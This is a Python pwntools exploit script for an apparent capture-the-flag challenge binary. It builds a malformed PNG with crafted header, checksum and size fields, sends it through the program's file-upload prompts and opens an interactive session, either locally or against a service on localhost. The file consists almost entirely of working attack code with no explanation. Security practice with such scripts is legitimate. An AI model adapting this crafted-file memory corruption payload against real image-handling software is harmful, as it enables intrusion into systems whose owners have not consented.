#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
import sys

#--------------------------info-----------------------------
binary_path = "./chal"
local_libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
remote_libc_path = "libc-2.23.so"

#--------------------------exploit--------------------------
def exploit():
    # with open("./1.png",'rb') as file:
    #     data = file.read()

    img_sz = 0x29
    pngHead = 0x0a1a0a0d474e5089
    checksum = 0x5ab9bc8a
    png = p64(pngHead) + b"\r" * (7)
    png += b"A"*( 0x1d - len(png) )
    png += p32(checksum)
    png += b"\x00"*3 + b"\x27"
    png += p32(0xb18)
    png += b"\x00" * (img_sz - len(png))

    # gdb.attach(p,"b *0x401A3F")

    p.sendlineafter("file?\n\n",str(len(png)))
    p.sendafter("here:\n\n",png)
    p.sendlineafter("colors?\n",'y')
    p.interactive()

#--------------------------main-----------------------------
if __name__ == '__main__':
    context.binary = ELF(binary_path)
    if sys.argv[1] == "r":
        p = remote("127.0.0.1",12000)
        elf = ELF(binary_path)
        libc = ELF(remote_libc_path)
    else:
        context.log_level='debug'
        context.terminal =['tmux','sp','-h']
        p = process(binary_path)
        elf = ELF(binary_path)
        libc = ELF(local_libc_path)
    exploit()